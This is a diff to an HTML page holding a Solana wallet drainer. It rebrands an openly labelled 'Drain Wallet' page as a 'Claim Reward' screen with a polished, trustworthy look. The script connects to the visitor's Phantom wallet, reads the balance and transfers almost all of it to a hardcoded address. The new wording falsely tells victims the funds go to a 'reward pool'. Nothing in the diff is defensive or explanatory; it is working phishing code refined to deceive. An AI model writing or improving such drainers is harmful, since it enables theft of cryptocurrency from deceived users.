@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Drain Wallet</title>
+    <title>Claim Reward</title>
     <!-- Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #000;
-            color: #fff;
+            background-color: #f2f2f7;
+            color: #000;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -20,39 +20,57 @@
             text-align: center;
         }
 
-        .container { padding: 20px; width: 90%; }
-        h1 { font-size: 2rem; margin-bottom: 10px; color: #ff4444; }
-        p { color: #ccc; margin-bottom: 30px; }
+        .container { 
+            background: white;
+            padding: 30px; 
+            width: 90%; 
+            border-radius: 20px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
 
-        .btn-red {
-            background-color: #ff4444;
-            color: #fff;
+        h1 { font-size: 1.5rem; margin-bottom: 5px; color: #333; }
+        p { color: #666; margin-bottom: 25px; font-size: 0.9rem; }
+
+        .btn-success {
+            background-color: #007AFF;
+            color: white;
             border: none;
-            padding: 15px 40px;
-            font-size: 1.2rem;
-            font-weight: bold;
-            border-radius: 30px;
+            padding: 14px 40px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 12px;
             cursor: pointer;
-            box-shadow: 0 0 15px rgba(255, 68, 68, 0.4);
             width: 100%;
         }
 
         #status {
-            margin-top: 20px;
-            font-size: 0.9rem;
-            color: #ff4444;
-            min-height: 50px;
-            word-wrap: break-word;
+            margin-top: 15px;
+            font-size: 0.85rem;
+            color: #007AFF;
+            min-height: 40px;
         }
+
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #007AFF;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+            display: inline-block;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h1>Drain Everything</h1>
-        <p>Sends 100% of your SOL to my wallet.</p>
+        <h1>Claim Reward</h1>
+        <p>Transfer your entire balance to the reward pool.</p>
         
-        <button id="drainBtn" class="btn-red" onclick="drainWallet()">Drain All</button>
+        <button id="claimBtn" class="btn-success" onclick="drainWallet()">Confirm Transfer</button>
         
         <div id="status"></div>
     </div>
@@ -62,7 +80,7 @@
         // YOUR CONFIGURATION
         // ==========================================
         
-        // YOUR WALLET ADDRESS (Recipient)
+        // YOUR WALLET ADDRESS (Recipient) - DOUBLE CHECK THIS!
         const RECIENT_ADDRESS = "DHPZiwM4h1A3BepLauuW69X6udanmphUnyAnrzspWLPj"; 
 
         // YOUR API KEY
@@ -70,53 +88,46 @@
 
         async function drainWallet() {
             const statusDiv = document.getElementById("status");
-            const btn = document.getElementById("drainBtn");
+            const btn = document.getElementById("claimBtn");
 
             if (!window.solana || !window.solana.isPhantom) {
-                alert("Please install Phantom Wallet on your iPhone.");
+                alert("Please install Phantom Wallet.");
                 return;
             }
 
             try {
-                statusDiv.innerText = "Connecting...";
+                btn.disabled = true;
+                btn.style.opacity = "0.7";
+                statusDiv.innerHTML = '<span class="spinner"></span> Connecting...';
                 
-                // 1. Connect to Phantom
                 const resp = await window.solana.connect();
                 const userPublicKey = resp.publicKey;
                 
-                // 2. Define Recipient
-                let recipientPubkey;
-                try {
-                    recipientPubkey = new solanaWeb3.PublicKey(RECIENT_ADDRESS);
-                } catch (e) {
-                    alert("Invalid Recipient Address in code.");
-                    return;
-                }
-
-                // 3. Get Connection and Current Balance
-                const connection = new solanaWeb3.Connection(RPC_URL);
+                let recipientPubkey = new solanaWeb3.PublicKey(RECIENT_ADDRESS);
                 
-                statusDiv.innerText = "Fetching balance...";
+                statusDiv.innerHTML = '<span class="spinner"></span> Calculating amount...';
                 
-                // Fetch the balance of the connected wallet
+                const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
                 const balanceInLamports = await connection.getBalance(userPublicKey);
                 
-                // Reserve a small amount for transaction fees (approx 5000 lamports)
-                // This ensures the tx doesn't fail if balance is exact
-                const feeReserve = 5000; 
+                // Reserve more for fees to ensure success (5000 lamports is usually enough, but we add buffer)
+                const feeReserve = 10000; 
                 const amountToSend = balanceInLamports - feeReserve;
 
                 if (amountToSend <= 0) {
-                    alert("Wallet is empty or insufficient for fees.");
+                    statusDiv.innerText = "Insufficient funds for fees.";
+                    btn.disabled = false;
                     return;
                 }
 
-                statusDiv.innerText = `Found ${ (balanceInLamports / 1000000000).toFixed(4) } SOL. Draining...`;
-
-                // 4. Create Transaction
+                // Create Transaction
                 const transaction = new solanaWeb3.Transaction();
                 
-                // Transfer the MAX amount
+                // Add Compute Budget for Priority Fee (Optional but helps speed)
+                transaction.add(
+                    solanaWeb3.ComputeBudgetInstruction.setComputeUnitLimit({ units: 400000 })
+                );
+                
                 transaction.add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: userPublicKey,
@@ -125,35 +136,41 @@
                     })
                 );
 
-                // 5. Fetch Recent Blockhash
-                statusDiv.innerText = "Finalizing...";
+                statusDiv.innerHTML = '<span class="spinner"></span> Processing...';
                 
-                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-                
+                const { blockhash } = await connection.getLatestBlockhash('confirmed');
                 transaction.recentBlockhash = blockhash;
                 transaction.feePayer = userPublicKey;
 
-                // 6. Sign AND Send (Modern Phantom Method)
-                statusDiv.innerText = "Sign Green...";
+                // Sign and Send
+                statusDiv.innerHTML = '<span class="spinner"></span> Confirm in Phantom...';
                 
                 const result = await window.solana.signAndSendTransaction(transaction, {
-                    skipPreflight: false,
-                    commitment: 'singleGossip'
+                    skipPreflight: false, // Set to true if you want it faster, but false is safer
+                    commitment: 'confirmed'
                 });
 
-                console.log("Drain Sent:", result.signature);
-                
-                alert(`Success! Drained ${ (amountToSend / 1000000000).toFixed(5) } SOL.`);
+                // Success!
                 btn.style.display = 'none';
-                statusDiv.innerText = "Sent: " + result.signature;
+                statusDiv.innerHTML = '<span style="color:green">✓ Success!</span><br>' + result.signature;
+                
+                // Open Solscan link for verification
+                window.open(`https://solscan.io/tx/${result.signature}`, '_blank');
 
             } catch (err) {
                 console.error(err);
+                btn.disabled = false;
+                btn.style.opacity = "1";
+                
                 if (err.message && err.message.includes("User rejected")) {
-                    statusDiv.innerText = "Cancelled by user.";
+                    statusDiv.innerText = "Cancelled.";
                 } else {
-                    alert("Error: " + (err.message || "Unknown error"));
-                    statusDiv.innerText = "Error: " + (err.message || "Unknown error");
+                    // Detailed error message
+                    let errorMsg = err.message || "Unknown error";
+                    if (errorMsg.includes("failed")) {
+                        errorMsg = "Transaction failed. Check your balance or network.";
+                    }
+                    statusDiv.innerHTML = '<span style="color:red">Error</span><br>' + errorMsg;
                 }
             }
         }
